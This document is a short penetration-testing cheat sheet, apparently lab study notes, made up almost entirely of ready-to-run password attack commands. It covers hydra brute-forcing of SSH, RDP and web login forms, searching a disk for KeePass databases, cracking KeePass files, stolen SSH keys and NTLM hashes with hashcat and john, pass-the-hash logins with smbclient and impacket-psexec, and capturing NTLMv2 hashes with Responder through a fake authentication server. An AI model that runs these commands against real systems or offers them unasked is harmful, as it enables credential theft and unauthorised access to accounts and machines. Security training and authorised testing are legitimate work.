# SSH or RDP
## Bruteforce User
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

## HTTP POST Login Form
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# Hash Cracking
1. Extract hashes
2. Format hashes
3. Prepare wordlist
4. Attack the hash
   
## Password Managers
- Searching for KeePass database files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

## Using keepass2john to format the KeePass database for Hashcat
- JtR script prepended the filename Database to the hash, **remove Database string**
keepass2john Database.kdbx > keepass.hash

## Cracking the KeePass database hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

## Stolen Private Keys
chmod 600 id_rsa 

ssh2john id_rsa > ssh.hash

- use /usr/share/hashcat/rules/rockyou-30000.rule 

sudo sh -c 'cat /home/araara/Downloads/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash 

ssh -i id_rsa -p 2222 dave@192.168.230.201

# NTLM 
## Crack the Hash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

[Refer to Mimikatz](https://github.com/arasakai17/CHEAT_SHEETS/blob/main/Mimikatz.md)
## Pass the Hash
- Don't crack if you can just pass the hash
1. smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
2. impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

# NTLMv2
Use [Responder](https://github.com/arasakai17/CHEAT_SHEETS/blob/main/MITM_Auth_Server.md)
Auth Server and capture the client NTLMv2 Hash.

## Attacker machine with fake Auth Server
sudo responder -I tun0

## From a shell on Target machine query Auth Server
dir \192.168.45.197\test
